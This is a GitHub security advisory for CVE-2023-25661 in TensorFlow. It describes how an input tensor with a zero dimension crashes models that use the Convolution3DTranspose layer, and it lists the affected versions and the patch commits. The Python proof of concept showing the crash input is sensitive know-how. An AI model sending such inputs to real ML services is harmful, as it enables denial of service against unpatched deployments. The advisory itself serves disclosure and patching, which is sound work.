# [M] TensorFlow Denial of Service vulnerability

## Summary
Severity: Medium
Advisory: GHSA-fxgc-95xx-grvq
CVE: CVE-2023-25661
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-03-27
Source: https://github.com/advisories/GHSA-fxgc-95xx-grvq
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.11.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.11.1

## Details
### Impact
A malicious invalid input crashes a tensorflow model (Check Failed) and can be used to trigger a denial of service attack.
To minimize the bug, we built a simple single-layer TensorFlow model containing a Convolution3DTranspose layer, which works well with expected inputs and can be deployed in real-world systems. However, if we call the model with a malicious input which has a zero dimension, it gives Check Failed failure and crashes. 
```python
import tensorflow as tf

class MyModel(tf.keras.Model):
    def __init__(self):
        super().__init__()
        self.conv = tf.keras.layers.Convolution3DTranspose(2, [3,3,3], padding="same")
        
    def call(self, input):
        return self.conv(input)
model = MyModel() # Defines a valid model.

x = tf.random.uniform([1, 32, 32, 32, 3], minval=0, maxval=0, dtype=tf.float32) # This is a valid input.
output = model.predict(x)
print(output.shape) # (1, 32, 32, 32, 2)

x = tf.random.uniform([1, 32, 32, 0, 3], dtype=tf.float32) # This is an invalid input.
output = model(x) # crash
```
This Convolution3DTranspose layer is a very common API in modern neural networks. The ML models containing such vulnerable components could be deployed in ML applications or as cloud services. This failure could be potentially used to trigger a denial of service attack on ML cloud services.

### Patches
We have patched the issue in
- GitHub commit [948fe6369a5711d4b4568ea9bbf6015c6dfb77e2](https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2)
- GitHub commit [85db5d07db54b853484bfd358c3894d948c36baf](https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq
- https://nvd.nist.gov/vuln/detail/CVE-2023-25661
- https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf
- https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2
- https://github.com/tensorflow/tensorflow
